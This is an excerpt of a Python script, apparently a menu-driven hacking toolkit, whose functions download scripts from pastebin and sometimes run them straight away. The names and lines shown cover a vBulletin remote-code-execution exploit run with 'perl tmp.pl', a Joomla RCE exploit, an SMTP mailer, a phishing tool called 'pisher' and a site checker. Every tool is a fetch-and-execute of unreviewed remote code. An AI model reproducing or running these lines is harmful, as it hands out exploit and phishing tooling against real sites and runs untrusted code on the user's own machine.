...
class bluepot:
    ...
    def install(self):
        ...
        os.system(
            "wget -O - https://github.com/andrewmichaelsmith/bluepot/master/bin/bluepot-0.1.tar.gz | tar xfz -")
...
def gabriel():
    ...
    os.system("wget http://pastebin.com/Szg20yUh --output-document=gabriel.py")
    clearScr()
...
def sitechecker():
    os.system("wget http://pastebin.com/Y0cqkjrj --output-document=ch01.py")
    clearScr()
...
def vbulletinrce():
    os.system("wget http://pastebin.com/eRSkgnZk --output-document=tmp.pl")
    os.system("perl tmp.pl")


def joomlarce():
    os.system("wget http://pastebin.com/EX7Gcbxk --output-document=temp.py")
    clearScr()
...
def smtpsend():
    os.system("wget http://pastebin.com/Nz1GzWDS --output-document=smtp.py")
    clearScr()
    os.system("python smtp.py")


def pisher():
    os.system("wget http://pastebin.com/DDVqWp4Z --output-document=pisher.py")
    clearScr()
